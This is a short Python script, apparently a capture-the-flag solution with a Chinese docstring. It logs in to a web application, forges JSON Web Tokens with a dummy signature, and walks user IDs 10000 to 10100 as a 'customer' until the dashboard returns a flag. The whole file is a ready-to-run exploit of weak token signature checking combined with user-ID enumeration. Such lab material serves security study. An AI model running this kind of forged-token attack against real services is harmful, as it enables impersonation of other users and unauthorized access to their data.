import requests, re, json, base64, sys

'''
@文件命名：X-027-24
@使用方式: python X-027-24.py url
@简述思路: 登录拿到会话后伪造弱校验 JWT，遍历 user_id 以 customer 身份访问 dashboard 获取 flag。
'''


def Scan(url):
    s = requests.Session()
    s.post(url + "/password/test", data={"username": "test","user_id": "10032","password": "test"})

    b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
    header = b64(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",", ":")).encode())

    for uid in range(10000, 10100 + 1):
        payload = b64(json.dumps({"username":"flag","user_id":uid,"user_type":"customer"}, separators=(",", ":")).encode())
        token = header + b"." + payload + b".AAAA"
        sess = s.cookies.get('session')
        r = s.get(url + "/dashboard", headers={"Cookie": f"session={sess}; auth_token={token.decode()}"})
        m = re.search(r"FLAG\{[^}]+\}", r.text)
        if m:
            return m.group(0)
    return ""


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
